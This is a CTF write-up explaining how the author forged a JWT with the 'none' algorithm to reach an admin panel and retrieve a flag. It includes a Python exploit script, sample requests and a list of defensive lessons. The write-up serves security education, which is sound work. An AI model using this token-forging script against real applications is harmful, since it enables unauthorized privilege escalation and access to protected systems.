# Bypassing JWT Authentication in WebApp Challenge

## Challenge Description

In this CTF challenge, we were presented with a web application that used JWT (JSON Web Tokens) for authentication. The goal was to bypass the authentication mechanism and access the admin panel to retrieve the flag.

## Initial Analysis

The web application used a login form that generated a JWT token upon successful authentication. The token was stored in a cookie and used for subsequent requests. Here's what the login request looked like:

```http
POST /api/login HTTP/1.1
Host: challenge.ctf.com
Content-Type: application/json

{
    "username": "user",
    "password": "password123"
}
```

The response included a JWT token:

```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjE1MjQ5MDIwfQ.7B9yqwK3Z4Y4Y4Z4Y4Z4Y4Z4Y4Z4Y4Z4"
}
```

## Vulnerability Discovery

After analyzing the token structure using [jwt.io](https://jwt.io), I noticed that the token used the HS256 algorithm for signing. The payload contained two interesting fields:

```json
{
    "user": "user",
    "role": "user",
    "iat": 1615249020
}
```

The presence of a "role" field suggested that the application might use this for authorization checks.

## Exploitation

I used the following Python script to attempt various JWT attacks:

```python
import jwt
import requests

def try_none_algorithm():
    payload = {
        "user": "admin",
        "role": "admin",
        "iat": 1615249020
    }
    
    # Create token with 'none' algorithm
    token = jwt.encode(
        payload,
        None,
        algorithm='none'
    )
    
    return token

def main():
    token = try_none_algorithm()
    print(f"Generated Token: {token}")
    
    # Try to access admin panel
    response = requests.get(
        'https://challenge.ctf.com/admin',
        headers={'Authorization': f'Bearer {token}'}
    )
    
    print(response.text)

if __name__ == '__main__':
    main()
```

The application accepted the modified token with the 'none' algorithm, allowing us to escalate privileges to admin.

## Flag Retrieval

After accessing the admin panel with our forged token, we found the flag in the response:

```
CTF{jwt_n0n3_4lg0_byp4ss_2024}
```

## Lessons Learned

This challenge highlighted several important security considerations:

1. Always validate JWT algorithms on the server side
2. Never accept 'none' as a valid algorithm
3. Use strong, securely stored secret keys
4. Implement proper signature verification

## Tools Used

- [jwt.io](https://jwt.io) - For token analysis
- [PyJWT](https://pyjwt.readthedocs.io/) - Python JWT library
- Burp Suite - For intercepting and modifying requests

## References

- [JWT Security Best Practices](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) 